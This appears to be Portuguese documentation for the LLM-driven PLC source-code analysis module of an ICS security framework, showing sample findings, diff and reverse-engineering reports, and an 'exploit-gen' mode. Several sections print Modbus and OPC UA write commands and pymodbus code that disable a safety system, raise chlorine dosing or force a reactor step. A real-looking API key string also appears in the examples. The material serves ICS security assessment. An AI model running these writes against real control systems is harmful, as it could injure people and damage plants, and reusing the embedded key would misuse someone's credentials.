# SAST / Análise LLM

O IXF inclui um motor de Análise Estática de Segurança (SAST) offline, alimentado por LLMs (Large Language Models). Analisa código-fonte PLC/RTU em busca de vulnerabilidades de segurança, setpoints inseguros, lacunas de autenticação, lógica de safety comprometida e vetores de ataque específicos para OT/ICS.

---

## Sumário

- [Visão Geral do Motor SAST](#visão-geral-do-motor-sast)
- [Provedores LLM Suportados](#provedores-llm-suportados)
- [Configurando Chaves LLM](#configurando-chaves-llm)
- [Sintaxe do Comando sast](#sintaxe-do-comando-sast)
- [Modos de Análise](#modos-de-análise)
  - [Modo sast — Análise Completa](#modo-sast--análise-completa-de-vulnerabilidades)
  - [Modo reverse — Engenharia Reversa](#modo-reverse--engenharia-reversa)
  - [Modo diff — Detecção de Mudanças](#modo-diff--detecção-de-mudanças-suspeitas)
  - [Modo exploit-gen — Geração de Exploit](#modo-exploit-gen--geração-de-exploit)
- [Linguagens PLC Suportadas](#linguagens-plc-suportadas)
- [Sanitização Antes do Envio ao LLM](#sanitização-antes-do-envio-ao-llm)
- [Categorias de Análise SAST](#categorias-de-análise-sast)
- [Exemplos SAST Incluídos](#exemplos-sast-incluídos)
- [Análise de Exemplos Incluídos](#análise-de-exemplos-incluídos)
- [Integração com Módulos IXF](#integração-com-módulos-ixf)
- [API Python para SAST](#api-python-para-sast)
- [Casos de Uso por Setor](#casos-de-uso-por-setor)
- [Boas Práticas](#boas-práticas)

---

## Visão Geral do Motor SAST

O motor SAST do IXF é implementado em `industrialxpl/modules/assessment/sast/plc_source_analyzer.py`. Funciona:

1. **Recebendo** código-fonte PLC ou diretório de projeto
2. **Detectando** a linguagem/extensão automaticamente
3. **Sanitizando** dados sensíveis antes do envio ao LLM
4. **Enviando** código sanitizado ao provider LLM configurado
5. **Analisando** a resposta e formatando o relatório de achados

O motor é 100% offline no sentido que o código PLC **nunca sai da sua rede** sem sanitização prévia. IPs privados são preservados (necessários para análise de lógica), mas IPs públicos, credenciais e hashes longos são removidos.

### Por que LLM para análise de código PLC?

Código PLC é diferente de código de software convencional:
- Linguagens IEC 61131-3 (ST, LD, FBD, IL, SFC) têm semântica específica de controle
- Setpoints têm significado físico (temperatura, pressão, concentração química)
- Lógica de safety tem padrões específicos (STO, SOS, SLS, E-Stop)
- Race conditions em PLC têm diferentes semânticas de ciclo de scan
- Impacto de vulnerabilidades é físico, não apenas computacional

LLMs treinados em código de engenharia identificam esses padrões com alta precisão.

---

## Provedores LLM Suportados

| Provider | Modelo Padrão | Variável de Ambiente | Notas |
|----------|---------------|---------------------|-------|
| OpenAI | `gpt-4o` | `OPENAI_API_KEY` | Melhor para análise de código complexo |
| Anthropic | `claude-3-5-sonnet-20241022` | `ANTHROPIC_API_KEY` | Excelente para análise de safety crítica |
| Google Gemini | `gemini-2.5-flash` | `GOOGLE_AI_STUDIO_API_KEY` | Rápido e econômico para volumes grandes |
| DeepSeek | `deepseek-chat` | `DEEPSEEK_API_KEY` | Alternativa econômica |
| Grok (xAI) | `grok-2-latest` | `XAI_API_KEY` | Boa análise técnica |

**Prioridade de seleção automática:**
1. OpenAI (se `OPENAI_API_KEY` configurado)
2. Anthropic (se `ANTHROPIC_API_KEY` configurado)
3. Google Gemini (se `GOOGLE_AI_STUDIO_API_KEY` configurado)
4. DeepSeek (se `DEEPSEEK_API_KEY` configurado)
5. Grok (se `XAI_API_KEY` configurado)
6. Provider mais recente configurado via `llm-key`

---

## Configurando Chaves LLM

### Opção 1: Variável de ambiente (recomendada)

Configure antes de iniciar o IXF. As variáveis são lidas automaticamente na inicialização:

```bash
# Linux/macOS — adicionar ao ~/.bashrc ou ~/.zshrc
export GOOGLE_AI_STUDIO_API_KEY="AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8"
export OPENAI_API_KEY="sk-svcacct-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
export ANTHROPIC_API_KEY="sk-ant-api03-xxxxxxxxxxxxxxxxxxxx"
export DEEPSEEK_API_KEY="ds-xxxxxxxxxxxxxxxxxxxx"
export XAI_API_KEY="xai-xxxxxxxxxxxxxxxxxxxx"
ixf
```

```powershell
# Windows PowerShell
$env:GOOGLE_AI_STUDIO_API_KEY = "AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8"
$env:OPENAI_API_KEY = "sk-svcacct-xxxx"
ixf
```

### Opção 2: Comando llm-key no shell (somente na sessão)

A chave é armazenada apenas em memória — **nunca gravada em disco ou log**:

```
ixf > llm-key gemini AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8
[+] LLM key configured: provider=gemini len=39

ixf > llm-key openai sk-svcacct-abcdefghijklmnopqrstuvwxyz0123456789
[+] LLM key configured: provider=openai len=45

ixf > llm-key anthropic sk-ant-api03-XXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=anthropic len=28
```

### Verificar status dos providers

```
ixf > llm-status

  Providers LLM
  ─────────────────────────────────────────────────────────────────────
  Provider     Status
  openai       configurado
  anthropic    não configurado
  gemini       configurado
  deepseek     não configurado
  grok         não configurado
  ─────────────────────────────────────────────────────────────────────
  Ativo: openai
```

---

## Sintaxe do Comando sast

```
sast <caminho> [--mode <modo>] [--diff <outro_arquivo>]
```

| Argumento | Tipo | Obrigatório | Padrão | Descrição |
|-----------|------|-------------|--------|-----------|
| `caminho` | string | sim | — | Arquivo fonte PLC ou diretório do projeto |
| `--mode` | string | não | `sast` | Modo de análise (ver abaixo) |
| `--diff` | string | não | — | Segundo arquivo para comparação (modo `diff`) |

---

## Modos de Análise

### Modo `sast` — Análise Completa de Vulnerabilidades

O modo padrão. Analisa o código-fonte PLC fornecido em busca de vulnerabilidades de segurança, parâmetros inseguros, lógica de safety comprometida e vetores de ataque exploráveis.

```
ixf > sast /opt/plc_projects/water_treatment/ --mode sast
[*] Alvo: water_treatment/ (5 arquivos, 245 linhas)
[*] Linguagens detectadas: ST (3), FBD (1), IL (1)
[*] Provider: openai (gpt-4o)
[*] Sanitizando código...
    Sanitizado: 2 credenciais, 1 IP público, 0 blobs hex
    IPs privados preservados: 192.168.1.100, 10.0.1.50
[*] Enviando 9,7 KB ao LLM (sanitizado)...
[*] Analisando resposta...

  RELATÓRIO DE ANÁLISE SAST — water_treatment/
  ═══════════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Setpoint de Dosagem de Cloro Não Validado
  ─────────────────────────────────────────────────────────────────
  Localização: water_treatment.st, linha 48
  Código:      SP_CHLORINE_HIGH := 4000.0;   (* Limite superior cloro *)
  Descrição:   O setpoint SP_CHLORINE_HIGH é definido como 4000.0 mg/L.
               O limite seguro da OMS para cloro residual em água potável é 2 mg/L.
               Este setpoint representa 2000 vezes o limite seguro.
  Vetor:       Qualquer dispositivo na rede pode escrever via Modbus FC16 em HR[200]
               (DOSE_FACTOR) sem autenticação. Um valor de 2000 em HR[200] resulta
               em dosagem de 4000 mg/L de cloro.
  Impacto:     4000 mg/L de cloro é uma concentração letal para crianças e
               potencialmente fatal para adultos. Pode causar queimaduras químicas
               severas e lesões pulmonares.
  MITRE:       T0836 (Modify Parameter), T0880 (Modify Alarm Settings)
  Exploit IXF: ixf > use exploits/protocols/modbus/modbus_write_register
               ixf > set target 192.168.1.100 | set register 200 | set value 2000
  Remediação:  1. Adicionar validação: IF DOSE_FACTOR > 2.0 THEN DOSE_FACTOR := 2.0;
               2. Implementar intertravamento físico independente
               3. Exigir autenticação para escrita em Modbus HR[200]
               4. Alertar no SCADA quando DOSE_FACTOR > 1.5

  FINDING [SEVERITY: CRITICAL]: Sistema de Safety Bypassado por Flag de Manutenção
  ─────────────────────────────────────────────────────────────────
  Localização: water_treatment.st, linhas 23-26
  Código:      IF Maintenance_Mode THEN
                   SIS_Enable := FALSE;  (* Desabilitar SIS em manutenção *)
                   alarm_ack := TRUE;    (* Aceitar todos os alarmes *)
               END_IF;
  Descrição:   O flag Maintenance_Mode desabilita o SIS (Safety Instrumented System)
               completamente e silencia todos os alarmes. Este flag pode ser definido
               via Modbus, OPC UA ou pela IHM sem autenticação separada.
  Vetor:       Atacante escreve Maintenance_Mode=1 via Modbus → SIS desabilitado →
               alarmes silenciados → condições inseguras não detectadas
  Impacto:     Processo de tratamento pode operar indefinidamente em condição insegura
               sem qualquer notificação ao operador.
  MITRE:       T0878 (Alarm Suppression), T0828 (Loss of Safety)
  Exploit IXF: ixf > use exploits/protocols/modbus/modbus_write_coil
               ixf > set target 192.168.1.100 | set coil 10 | set value on
  Remediação:  1. Requer autenticação de dois fatores para habilitar Maintenance_Mode
               2. Limite de tempo: Maintenance_Mode expira após 60 minutos
               3. Não desabilitar SIS — usar modo de bypass com registro obrigatório
               4. Notificar supervisor quando Maintenance_Mode ativado

  FINDING [SEVERITY: HIGH]: Parâmetros PID Sem Validação de Faixa
  ─────────────────────────────────────────────────────────────────
  Localização: pump_station.fbd, bloco PID_PressureControl
  Código:      PID_PressureControl(
                   Setpoint := Pressure_SP,  (* Sem validação *)
                   Kp := Kp_Gain,            (* Sem limites *)
                   Ki := Ki_Gain             (* Pode causar windup *)
               )
  Descrição:   Ganhos PID e setpoint de pressão não têm validação de faixa.
               Valores extremos de Kp/Ki podem causar oscilação severa ou
               instabilidade no controle de pressão.
  Remediação:  Adicionar validação: MIN(MAX(Pressure_SP, 0.0), 10.0) para setpoints;
               Adicionar anti-windup ao integrador PID.

  FINDING [SEVERITY: HIGH]: Credencial Hardcoded em Código
  ─────────────────────────────────────────────────────────────────
  Localização: water_treatment.st, linha 12
  Código:      Operator_Password := [CREDENTIAL_REDACTED];  (* Sanitizado *)
  Descrição:   Senha de operador hardcoded no código-fonte PLC. Qualquer pessoa
               com acesso ao arquivo de projeto pode obter a senha.
  Remediação:  Usar sistema de autenticação externo; nunca hardcodar credenciais.

  FINDING [SEVERITY: MEDIUM]: Race Condition em Variável Compartilhada
  ─────────────────────────────────────────────────────────────────
  Localização: water_treatment.st, linhas 67-78
  Descrição:   Flow_Total é lida em OB1 (ciclo principal) e escrita em OB35
               (interrupção cíclica 100ms) sem mecanismo de exclusão mútua.
               Em CLPs Siemens S7, isso pode resultar em leituras inconsistentes.
  Remediação:  Usar STRUCT_COPY ou variáveis de interface (IN_OUT) para acesso seguro.

  ═══════════════════════════════════════════════════════════════════
  RESUMO: 2 CRITICAL, 2 HIGH, 1 MEDIUM, 0 LOW
  ═══════════════════════════════════════════════════════════════════
```

### Modo `reverse` — Engenharia Reversa

Para firmware binário compilado ou código descompilado. O LLM analisa padrões em código de máquina ou código descompilado para identificar funcionalidades suspeitas.

```
ixf > sast /opt/firmware/controller_v2.bin --mode reverse
[*] Alvo: controller_v2.bin (binário — 2.4 MB)
[*] Modo: reverse engineering
[*] Provider: gemini
[*] Decompilando binário ARM Cortex-M4...
[*] Extraindo strings, tabelas de função, referências...
[*] Sanitizando e enviando ao LLM (64 KB de seções relevantes)...

  RELATÓRIO DE ENGENHARIA REVERSA — controller_v2.bin
  ═══════════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Backdoor Oculta Detectada
  Localização: Offset 0x8A234 — função sub_8A234
  Descrição:   Função que verifica sequence número de série contra hash hardcoded.
               Se matching, habilita modo de depuração com acesso completo ao I/O.
  Padrão:      strcmp(serial, "XYZ-9A3F-...") → set debug_mode = 1
  Evidência:   String hardcoded em offset 0x8B108: "DEBUG_OVERRIDE_v2"
  Impacto:     Acesso completo ao sistema via backdoor de fábrica não documentada.

  FINDING [SEVERITY: HIGH]: Função de Atualização Sem Verificação de Assinatura
  Localização: Offset 0x3C100 — função update_firmware
  Descrição:   Firmware recebe payload de atualização via UART sem verificação
               de assinatura digital. Qualquer firmware pode ser carregado.
  Remediação:  Implementar verificação de assinatura RSA-2048 antes de aceitar firmware.
```

### Modo `diff` — Detecção de Mudanças Suspeitas

Compara duas versões do mesmo programa PLC e identifica mudanças com implicações de segurança.

```
ixf > sast /opt/plc/v2.3_original.st --mode diff --diff /opt/plc/v2.3_modificado.st
[*] Modo: diff comparison
[*] Arquivo original: v2.3_original.st (89 linhas)
[*] Arquivo modificado: v2.3_modificado.st (91 linhas)
[*] Provider: anthropic (claude-3-5-sonnet)
[*] Analisando diferenças...

  RELATÓRIO DE ANÁLISE DIFERENCIAL
  ═══════════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Limite de Safety de Temperatura Elevado
  ─────────────────────────────────────────────────────────────────
  Arquivo:     v2.3_original.st vs v2.3_modificado.st

  Original  (linha 34):  SP_TEMP_TRIP := 280.0;  (* Seguro conforme especificação *)
  Modificado (linha 34): SP_TEMP_TRIP := 450.0;  (* Elevado sem documentação *)

  Análise:   O ponto de trip de temperatura foi elevado de 280°C para 450°C,
             representando um aumento de 60% acima da especificação segura do fabricante.
             Sem documentação de aprovação de engenharia para esta mudança.
  Impacto:   O sistema de proteção de temperatura não disparará em condições que
             normalmente causariam dano ao equipamento ou explosão.
  MITRE:     T0836 (Modify Parameter), T0833 (Modify Control Logic)
  Risco:     Possível sabotagem ou modificação não autorizada pós-manutenção.
  Ação:      Reverter imediatamente para valor original. Investigar quem fez a mudança
             e quando. Verificar se outros setpoints foram alterados.

  FINDING [SEVERITY: HIGH]: Watchdog Desabilitado na Versão Modificada
  ─────────────────────────────────────────────────────────────────
  Original  (linha 12): WATCHDOG_ENABLE := TRUE;
  Modificado (linha 12): WATCHDOG_ENABLE := FALSE;  (* sem justificativa *)

  Análise:   O watchdog timer foi desabilitado. Em condição de travamento de CPU,
             o sistema não fará reset automático de segurança.
  Impacto:   Processo pode permanecer em estado indefinido (potencialmente inseguro)
             sem detecção.

  FINDING [SEVERITY: HIGH]: Lógica de E-Stop Contornada
  ─────────────────────────────────────────────────────────────────
  Original  (linha 67): IF NOT E_STOP THEN Motor_Run := TRUE; END_IF;
  Modificado (linha 67): IF NOT E_STOP OR Override_Flag THEN Motor_Run := TRUE; END_IF;

  Análise:   O E-Stop pode ser contornado via Override_Flag. Esta flag pode ser
             definida remotamente via Modbus sem autenticação.
  Impacto:   Motor pode rodar mesmo com E-Stop ativado fisicamente.

  FINDING [SEVERITY: MEDIUM]: Nova Instrução de Rede Adicionada
  ─────────────────────────────────────────────────────────────────
  Adicionado (linha 89): MB_CLIENT(REQ := TRUE, IP_ADDR := '10.0.0.99', ...);

  Análise:   Uma nova instrução Modbus client foi adicionada na versão modificada.
             Cria conexão de saída para 10.0.0.99 que não estava no projeto original.
             Pode ser canal de exfiltração de dados de processo ou C2.

  ═══════════════════════════════════════════════════════════════════
  RESUMO DIFF: 1 CRITICAL, 3 HIGH, 1 MEDIUM
  Recomendação: Não implantar versão modificada. Iniciar investigação forense.
  ═══════════════════════════════════════════════════════════════════
```

### Modo `exploit-gen` — Geração de Exploit

Analisa o código PLC e gera exploits específicos baseados nas vulnerabilidades encontradas. Útil para verificação de exploitabilidade em laboratório.

```
ixf > sast /opt/plc/reactor_batch.sfc --mode exploit-gen
[*] Alvo: reactor_batch.sfc (Sequential Function Chart, 156 linhas)
[*] Modo: exploit generation
[*] Provider: openai (gpt-4o)

  ANÁLISE DE EXPLOIT — reactor_batch.sfc
  ═══════════════════════════════════════════════════════════════════

  VULNERABILIDADE: Transition T_003 sem validação de estado pré-condição
  ─────────────────────────────────────────────────────────────────
  Descrição: A transição T_003 (HEATING → REACTION) não valida que o nível
             do reator está acima do mínimo necessário antes de ativar
             o sistema de aquecimento.
  Condição:  T_003 := Timer_Heating.Q  (* apenas timer, sem nível mínimo *)

  EXPLOIT GERADO:
  Objetivo:  Forçar transição para estado REACTION sem nível adequado
             → aquecimento aplicado a reator insuficientemente cheio
             → risco de superaquecimento e liberação de vapor pressurizado

  Método 1 — Modbus Write (se disponível):
    from pymodbus.client import ModbusTcpClient
    c = ModbusTcpClient('192.168.1.100')
    c.connect()
    c.write_register(300, 1)  # SFC_STEP_OVERRIDE = 1 (Step 3 = REACTION)
    c.close()

  Método 2 — OPC UA Write (se servidor UA ativo):
    use exploits/protocols/opcua/opcua_write_variable
    set node_id "ns=2;i=1003"  # SFC.CurrentStep
    set value 3                 # REACTION step

  Módulo IXF equivalente:
    use exploits/protocols/modbus/modbus_write_register
    set target 192.168.1.100
    set register 300
    set value 1

  VERIFICAÇÃO DE EXPLOITABILIDADE:
    ixf > use exploits/protocols/modbus/modbus_write_register
    ixf > set target 192.168.1.100
    ixf > set register 300
    ixf > check   # Verificar se porta Modbus está acessível
```

---

## Linguagens PLC Suportadas

O motor SAST detecta automaticamente a linguagem pelo conteúdo e extensão do arquivo.

| Linguagem | Padrão IEC | Extensões Suportadas | Notas |
|-----------|-----------|---------------------|-------|
| Structured Text (ST) | IEC 61131-3 | `.st`, `.iecst`, `.scl`, `.awl` | Mais suportada |
| Ladder Diagram (LD) | IEC 61131-3 | `.lad`, `.ld`, `.ldr` | Análise textual via exportação |
| Function Block Diagram (FBD) | IEC 61131-3 | `.fbd` | Análise via XML |
| Instruction List (IL) | IEC 61131-3 | `.il`, `.awl`, `.stl` | Siemens STL/AWL |
| Sequential Function Chart (SFC) | IEC 61131-3 | `.sfc` | Análise via XML |
| Siemens SCL | Siemens | `.scl` | Step 7, TIA Portal |
| Siemens STL/AWL | Siemens | `.stl`, `.awl` | Step 7 legado |
| Rockwell Studio 5000 | Rockwell | `.l5x` | XML exportado |
| ABB Automation Builder | ABB | `.ap1`, `.ap15` | ABB série Compact |
| CODESYS | CODESYS | `.pro`, `.project`, `.pou` | Múltiplos vendors |
| Beckhoff TwinCAT | Beckhoff | `.tpy`, `.pro` | TwinCAT 2/3 |
| GX Works (Mitsubishi) | Mitsubishi | `.gx3` | Via exportação texto |

### Análise de diretório multi-arquivo

Quando um diretório é fornecido, o IXF analisa todos os arquivos PLC reconhecidos:

```
ixf > sast /opt/plc_project/ --mode sast
[*] Alvo: plc_project/ (8 arquivos, 512 linhas)
[*] Linguagens detectadas:
    ST:  water_treatment.st (89L), pump_control.st (67L), dosing.st (54L)
    FBD: pid_pressure.fbd (45L)
    SFC: batch_sequence.sfc (156L)
    LD:  safety_logic.ld (38L)
    SCL: hmi_interface.scl (33L)
    AWL: legacy_module.awl (30L)
```

---

## Sanitização Antes do Envio ao LLM

O IXF aplica múltiplas camadas de sanitização antes de enviar qualquer código ao provider LLM, protegendo dados sensíveis.

### Tabela de sanitização

| Tipo de Dado | Substituído Por | Exemplo |
|-------------|-----------------|---------|
| IPs públicos (não-RFC1918) | `[IP_REDACTED]` | `8.8.8.8` → `[IP_REDACTED]` |
| IPs privados RFC1918 | **Preservados** | `192.168.1.100` mantido (necessário para análise) |
| Strings que parecem senhas | `[CREDENTIAL_REDACTED]` | `password := 'admin123'` → `[CREDENTIAL_REDACTED]` |
| Hostnames externos | `[HOST_REDACTED]` | `plc.empresa.com` → `[HOST_REDACTED]` |
| Hashes/blobs hex longos (>32 chars) | `[HEXBLOB_REDACTED]` | Chaves binárias, certificados hex |
| Blobs Base64 longos (>40 chars) | `[B64BLOB_REDACTED]` | Certificados X.509, assinaturas |
| Linhas excessivamente longas (>300 chars) | Truncadas com `[LINE_TRUNCATED]` | Dados binários inline |

### Relatório de sanitização

O relatório de sanitização é exibido antes da análise:

```
[*] Sanitizando código...
    Sanitizado: 2 credenciais, 1 IP público, 3 blobs hex, 0 hostnames externos
    IPs privados preservados: 192.168.1.100, 10.0.1.50, 172.16.0.5
    Tamanho original: 12,450 chars | Tamanho sanitizado: 10,823 chars
```

### Orçamento de tokens

O payload enviado ao LLM é limitado a **32.000 caracteres** (~8.000 tokens) para compatibilidade com todos os modelos. Se o projeto exceder o limite:

```
[*] Tamanho do projeto: 85,230 chars (excede limite de 32,000)
[*] Estratégia de segmentação: analisando em 3 partes
[*] Parte 1/3: water_treatment.st, pump_control.st (10,100 chars)
[*] Parte 2/3: dosing.st, pid_pressure.fbd, batch_sequence.sfc (11,200 chars)
[*] Parte 3/3: safety_logic.ld, hmi_interface.scl, legacy_module.awl (10,720 chars)
[*] Consolidando relatórios parciais...
```

---

## Categorias de Análise SAST

O prompt do LLM instrui a análise em 8 categorias específicas de OT/ICS:

### 1. Setpoints e Parâmetros de Processo

Verificação de setpoints que podem causar dano físico se modificados:
- Limites de temperatura, pressão, concentração química
- Velocidades de motor acima das especificações
- Volumes de dosagem de substâncias perigosas
- Setpoints de corrente elétrica em subestações

**Exemplos de achados:**
- `SP_CHLORINE_HIGH := 4000.0` — cloro 2000x acima do limite seguro
- `MAX_PRESSURE := 500.0` — pressão acima da especificação do vaso
- `MOTOR_SPEED_MAX := 9999` — velocidade acima do limite mecânico

### 2. Lógica de Sistema de Safety

Verificação de mecanismos de segurança que podem ser comprometidos:
- E-Stop (Emergency Stop) com bypass ou override não documentado
- STO (Safe Torque Off) com condições de bypass
- SOS (Safe Operating Stop) com flags de override
- SLS (Safely Limited Speed) com verificação fraca
- Alarmes silenciados ou com threshold muito alto
- Watchdog timer desabilitado

### 3. Autenticação e Controle de Acesso

- Credenciais hardcoded no código-fonte
- Flags de bypass de autenticação
- Comandos privilegiados sem verificação de autorização
- Acesso não registrado a funções críticas

### 4. Validação de Entradas Externas

- Entradas Modbus/OPC UA sem verificação de limites
- Dados de IHM/HMI passados diretamente para atuadores
- Parâmetros de receita sem validação
- Valores de setpoint sem verificação de faixa segura

### 5. Race Conditions e Timing

- Acesso simultâneo a variáveis compartilhadas entre OBs
- Interrupções cíclicas que modificam variáveis usadas no ciclo principal
- Timing de sequência que pode causar transições de estado incorretas
- Uso de TIMER sem tratamento de overflow

### 6. Rede e Comunicação

- Protocolos sem criptografia para dados críticos
- Conexões de saída não documentadas (possível C2)
- MQTT sem autenticação
- Comunicação com IPs externos não documentados

### 7. Falhas de Lógica e Cenários de Ataque

- Padrões que permitem ataque de replay
- Sequências de estado que podem ser manipuladas remotamente
- Lógica de falha que resulta em estado inseguro em vez de estado seguro
- Condições de corrida em lógica de intertravamento

### 8. Resumo de Achados

Relatório estruturado com severidade CRITICAL/HIGH/MEDIUM/LOW e recomendações de remediação priorizadas.

---

## Exemplos SAST Incluídos

O IXF inclui 17 exemplos de código PLC realistas com vulnerabilidades documentadas, localizados em `industrialxpl/resources/sast_examples/`.

| Arquivo | Setor | Processo | Vulnerabilidades Principais |
|---------|-------|---------|----------------------------|
| `nuclear_reactor_cooling.st` | Nuclear | Resfriamento de reator | SCRAM bypassado via Maintenance_Mode |
| `water_treatment_chemical_dosing.st` | Água | Tratamento de água | Cloro 4000 mg/L, SIS desabilitável |
| `gas_pipeline_pressure_control.st` | O&G | Gasoduto | ESD + SIS ambos bypassed |
| `power_grid_substation.st` | Energia | Subestação elétrica | DNP3 sem SAv5, disjuntores manipuláveis |
| `oil_refinery_process.st` | O&G | Refinaria de petróleo | Aquecedor acima do limite de projeto |
| `wind_farm_scada.st` | Energia | Parque eólico | MQTT sem autenticação, credenciais expostas |
| `automotive_assembly_line.st` | Manufatura | Linha de montagem | E-Stop bypass, limites de torque hardcoded |
| `pharmaceutical_batch.sfc` | Farmacêutica | Processamento em batch | Validação FDA comprometida |
| `food_beverage_pasteurization.fbd` | Alimentos | Pasteurização | Temperatura insuficiente bypassável |
| `building_hvac_control.st` | Predial | HVAC | CO2 sensor ignorado, ventilação desabilitável |
| `chemical_reactor_batch.st` | Química | Reator químico | Temperatura acima do limite de projeto |
| `water_pump_station.ld` | Água | Estação de bombeamento | Proteção de bomba bypassável |
| `mining_conveyor_control.st` | Mineração | Esteira transportadora | Proteção de sobrecarga desabilitada |
| `smart_grid_balancing.st` | Energia | Balanceamento de carga | Injeção de falsos dados de medição |
| `railway_signaling.sfc` | Ferroviário | Sinalização | Conflito de sinal bypass |
| `maritime_ballast_system.st` | Marítimo | Sistema de lastro | Overflow de tanque possível |
| `wastewater_treatment.st` | Água | Tratamento de efluentes | Descarte de material tóxico sem tratamento |

### Analisar um exemplo incluído

```
ixf > llm-key gemini AIzaSy...
ixf > sast industrialxpl/resources/sast_examples/nuclear_reactor_cooling.st

[*] Alvo: nuclear_reactor_cooling.st (1 arquivo, 234 linhas)
[*] Linguagem: ST (Structured Text)
[*] Provider: gemini (gemini-2.5-flash)
[*] Sanitizando... 0 credenciais, 0 IPs públicos
[*] Enviando 8,9 KB ao LLM...

  RELATÓRIO DE ANÁLISE SAST — nuclear_reactor_cooling.st
  ═══════════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: SCRAM (Emergency Shutdown) Desabilitado em Manutenção
  Localização: linha 45
  Código:  IF Maintenance_Mode THEN SCRAM_Enable := FALSE; END_IF;
  Descrição: O sistema SCRAM (Shutdown Cooling Reactor Automatic Mechanism) é
             completamente desabilitado quando Maintenance_Mode = TRUE.
             Este flag pode ser definido via Modbus FC05 na bobina 50.
  Impacto: CATASTRÓFICO — Reator não pode ser desligado de emergência durante
           falha de resfriamento. Potencial de fusão do núcleo.
  MITRE:   T0836, T0828, T0879
  Remediação: NUNCA desabilitar SCRAM via software. Usar bypass físico documentado
              com procedimento de segurança aprovado pela autoridade regulatória.

  FINDING [SEVERITY: CRITICAL]: Setpoint de Temperatura de Coolant Manipulável
  Localização: linha 89
  Código:  Coolant_Temp_Max := Maintenance_Setpoint;  (* somente manutenção *)
  Descrição: O limite máximo de temperatura do coolant é redefinível via parâmetro
             de manutenção. Pode ser elevado acima dos limites seguros de projeto.
  …
```

---

## Integração com Módulos IXF

O motor SAST integra com o sistema de módulos IXF para análise contextualizada:

### Uso via módulo assessment

```
ixf > use assessment/sast/plc_source_analyzer
[+] Module loaded: PLC Source Code SAST Analyzer

ixf (PLC Source Code SAST Analyzer) > show options
+----------+-----------+--------+------------------------------------------+
| Opção    | Valor     | Obrig. | Descrição                                |
|----------|-----------|--------|------------------------------------------|
| target   |           | sim    | Caminho do arquivo/diretório PLC         |
| mode     | sast      | não    | Modo de análise: sast/reverse/diff/exploit-gen |
| diff_with|           | não    | Segundo arquivo para modo diff           |
| simulate | False     | não    | Não aplicável ao SAST (sempre executa)   |
+----------+-----------+--------+------------------------------------------+

ixf (PLC Source Code SAST Analyzer) > set target /opt/plc/water_treatment.st
ixf (PLC Source Code SAST Analyzer) > set mode sast
ixf (PLC Source Code SAST Analyzer) > run
```

### Uso direto via comando sast

O comando `sast` é um atalho que carrega e executa o módulo automaticamente:

```
# Equivalente ao fluxo acima
ixf > sast /opt/plc/water_treatment.st --mode sast

# Modo diff
ixf > sast /opt/plc/v1.st --mode diff --diff /opt/plc/v2.st

# Modo reverse
ixf > sast /opt/firmware/controller.bin --mode reverse

# Exploit generation
ixf > sast /opt/plc/batch.sfc --mode exploit-gen
```

---

## API Python para SAST

O motor SAST pode ser usado programaticamente:

```python
from industrialxpl.modules.assessment.sast.plc_source_analyzer import (
    _llm_manager,
    PLCSourceAnalyzer,
)

# Configurar provider LLM
_llm_manager.set_key("gemini", "AIzaSy...")

# Instanciar analisador
analyzer = PLCSourceAnalyzer()
analyzer.target = "/opt/plc/water_treatment/"
analyzer.mode = "sast"

# Executar análise
analyzer.run()

# Para uso em scripts de automação
import os
os.environ["GOOGLE_AI_STUDIO_API_KEY"] = "AIzaSy..."

cls = import_exploit("industrialxpl.modules.assessment.sast.plc_source_analyzer")
mod = cls()
mod.target = "/opt/plc/project/"
mod.mode = "sast"
mod.simulate = False  # SAST sempre executa mesmo com simulate=True
mod.run()
```

---

## Casos de Uso por Setor

### Setor de Água e Saneamento

```
ixf > sast /opt/plc/water_treatment/
# Foco em: dosagem química, limites de pH, proteções de bomba, cloração

ixf > sast industrialxpl/resources/sast_examples/water_treatment_chemical_dosing.st
# Exemplo incluído com vulnerabilidades conhecidas para treinamento
```

### Setor de Energia Elétrica

```
ixf > sast /opt/iec61850/substation_protection.st
# Foco em: lógica de proteção de relés, habilitação de disjuntores,
#           interlocking de barramento, coordination de proteção

ixf > sast industrialxpl/resources/sast_examples/power_grid_substation.st
```

### Óleo e Gás

```
ixf > sast /opt/plc/pipeline_ems/
# Foco em: sistemas ESD, pressão máxima de operação, válvulas de alívio,
#           detecção de vazamentos, proteção de compressores

ixf > sast industrialxpl/resources/sast_examples/gas_pipeline_pressure_control.st
```

### Manufatura Farmacêutica / Alimentícia

```
ixf > sast /opt/batch/pharmaceutical_process.sfc --mode sast
# Foco em: sequência de batch, temperaturas de esterilização,
#           integridade de dados 21 CFR Part 11, rastreabilidade
```

### Nuclear

```
ixf > sast industrialxpl/resources/sast_examples/nuclear_reactor_cooling.st
# ALTAMENTE SENSITIVO — usar apenas em ambiente de laboratório controlado
# Foco em: SCRAM, sistemas de resfriamento de emergência, containment
```

---

## Boas Práticas

### 1. Use modo diff regularmente em qualquer mudança de código PLC

```
# Antes de qualquer implantação:
ixf > sast /opt/plc/producao/current.st --mode diff --diff /opt/plc/staging/next.st
# Detecta mudanças suspeitas antes da implantação
```

### 2. Automatize análise SAST em pipelines CI/CD de engenharia

```bash
#!/bin/bash
# Script de verificação pré-implantação PLC
CURRENT_VERSION="/opt/plc/v${CURRENT_VER}.st"
NEW_VERSION="/opt/plc/v${NEW_VER}.st"

echo "Executando análise SAST diferencial..."
ixf sast "$CURRENT_VERSION" --mode diff --diff "$NEW_VERSION"
if [ $? -ne 0 ]; then
    echo "SAST encontrou problemas críticos — implantação bloqueada"
    exit 1
fi
```

### 3. Nunca envie código com credenciais reais — verifique sanitização

```
ixf > sast /opt/plc/project/ --mode sast
# Verificar relatório de sanitização antes de confirmar envio:
# [*] Sanitizando... 3 credenciais, 2 IPs públicos
# Confirmar que dados sensíveis foram removidos
```

### 4. Para firmware binário, use modo reverse com contexto de arquitetura

```
# Fornecer contexto no caminho para ajudar na análise
ixf > sast /opt/firmware/siemens_cpu314_v3.6.bin --mode reverse
```

### 5. Compare achados SAST com módulos de exploit IXF para verificação

```
